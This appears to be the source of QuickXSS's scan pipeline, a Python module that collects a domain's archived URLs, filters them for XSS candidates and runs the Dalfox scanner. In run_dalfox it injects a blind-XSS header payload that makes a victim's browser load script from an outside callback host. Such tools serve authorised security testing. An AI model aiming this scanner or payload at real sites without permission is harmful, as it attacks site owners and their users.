"""Execution pipeline for QuickXSS."""

from __future__ import annotations

import subprocess
from pathlib import Path
from typing import Iterable

from quickxss.models.scan import ScanConfig, ScanResult
from quickxss.scan.deps import check_binaries, check_gf_pattern
from quickxss.scan.errors import ToolError
from quickxss.scan.io import dedupe_preserve_order, ensure_scan_paths, write_lines
from quickxss.utils.log import Logger
from quickxss.utils.progress import Progress


def run_scan(config: ScanConfig, logger: Logger) -> ScanResult:
    """Run the QuickXSS scan pipeline."""

    required = ["gf", "dalfox"]
    if config.use_wayback:
        required.append("waybackurls")
    if config.use_gau:
        required.append("gau")

    check_binaries(required)
    check_gf_pattern(config.gf_pattern)

    paths = ensure_scan_paths(
        config.results_dir, config.domain, config.output_name, config.overwrite
    )

    progress = Progress(enabled=not logger.quiet)

    urls = collect_urls(config, logger, progress)
    write_lines(paths.urls_file, urls)

    logger.info(f"Collected {len(urls)} unique URLs.")

    candidates = build_candidates(config, urls, logger, progress)
    write_lines(paths.temp_xss_file, candidates)
    deduped = dedupe_preserve_order(candidates)
    write_lines(paths.xss_file, deduped)

    logger.info(f"Prepared {len(deduped)} candidate URLs.")

    if not config.keep_temp:
        paths.temp_xss_file.unlink(missing_ok=True)

    # Always create the output file, even when no findings are reported.
    paths.results_file.write_text("", encoding="utf-8")

    if deduped:
        run_dalfox(config, paths.xss_file, paths.results_file, logger, progress)
    else:
        # Avoid invoking Dalfox when there are no candidates.
        logger.warn("No candidate URLs found. Skipping Dalfox scan.")

    findings = count_findings(paths.results_file)

    return ScanResult(
        total_urls=len(urls),
        candidate_urls=len(deduped),
        findings=findings,
        results_file=paths.results_file,
    )


def collect_urls(config: ScanConfig, logger: Logger, progress: Progress) -> list[str]:
    """Collect URLs from configured sources."""

    urls: list[str] = []
    if config.use_wayback:
        message = "[waybackurls] Collecting URLs..."
        if progress.enabled:
            with progress.task(message):
                urls.extend(run_wayback(config.domain, logger))
        else:
            logger.info(message)
            urls.extend(run_wayback(config.domain, logger))
    if config.use_gau:
        message = "[gau] Collecting URLs..."
        if progress.enabled:
            with progress.task(message):
                urls.extend(run_gau(config.domain, logger))
        else:
            logger.info(message)
            urls.extend(run_gau(config.domain, logger))
    normalized = normalize_lines(urls)
    return dedupe_preserve_order(normalized)


def build_candidates(
    config: ScanConfig, urls: list[str], logger: Logger, progress: Progress
) -> list[str]:
    """Filter URLs using gf and normalize parameters."""

    if not urls:
        return []
    message = f"[gf:{config.gf_pattern}] Filtering URLs..."
    if progress.enabled:
        with progress.task(message):
            gf_output = run_gf(config.gf_pattern, urls, logger)
    else:
        logger.info(message)
        gf_output = run_gf(config.gf_pattern, urls, logger)
    normalized = [normalize_candidate(line) for line in gf_output]
    return [line for line in normalized if line]


def run_wayback(domain: str, logger: Logger) -> list[str]:
    """Run waybackurls for a domain."""

    output = run_command(["waybackurls"], domain + "\n", logger)
    return normalize_lines(output.splitlines())


def run_gau(domain: str, logger: Logger) -> list[str]:
    """Run gau for a domain."""

    output = run_command(["gau", domain], None, logger)
    return normalize_lines(output.splitlines())


def run_gf(pattern: str, urls: Iterable[str], logger: Logger) -> list[str]:
    """Run gf with the given pattern on a URL list."""

    input_text = "\n".join(urls) + "\n"
    output = run_command(["gf", pattern], input_text, logger)
    return normalize_lines(output.splitlines())


def run_dalfox(
    config: ScanConfig, xss_file: Path, output_file: Path, logger: Logger, progress: Progress
) -> None:
    """Run Dalfox against the candidate file."""

    cmd = ["dalfox", "file", str(xss_file), "-o", str(output_file)]
    if config.blind_payload:
        cmd.extend([
            "-b",
            config.blind_payload,
            "-H",
            f"referrer: xxx'><script src=//{config.blind_payload}></script>",
        ])
    cmd.extend(config.dalfox_args)
    message = "[dalfox] Running scan (this might take a while)..."
    if progress.enabled:
        with progress.task(message):
            run_command(cmd, None, logger)
    else:
        logger.info(message)
        run_command(cmd, None, logger)


def run_command(command: list[str], input_text: str | None, logger: Logger) -> str:
    """Run a subprocess and return stdout."""

    logger.debug(f"Running: {' '.join(command)}")
    try:
        result = subprocess.run(
            command,
            input=input_text,
            capture_output=True,
            text=True,
            check=False,
        )
    except FileNotFoundError as exc:
        raise ToolError(f"Command not found: {command[0]}", command=command) from exc

    if result.returncode != 0:
        stderr = result.stderr.strip()
        message = stderr or "External tool failed."
        raise ToolError(message, command=command)

    if logger.verbose and result.stderr:
        logger.debug(result.stderr.strip())

    return result.stdout


def normalize_lines(lines: Iterable[str]) -> list[str]:
    """Normalize lines by stripping whitespace and dropping empties."""

    return [line.strip() for line in lines if line.strip()]


def normalize_candidate(line: str) -> str:
    """Normalize a candidate URL to match the legacy sed behavior."""

    cleaned = line.strip()
    if cleaned.startswith("URL: "):
        cleaned = cleaned[5:]
    if "=" in cleaned:
        prefix, _ = cleaned.split("=", 1)
        cleaned = f"{prefix}="
    return cleaned


def count_findings(results_file: Path) -> int:
    """Count non-empty findings in the results file."""

    if not results_file.exists():
        return 0
    lines = results_file.read_text(encoding="utf-8").splitlines()
    return len([line for line in lines if line.strip()])
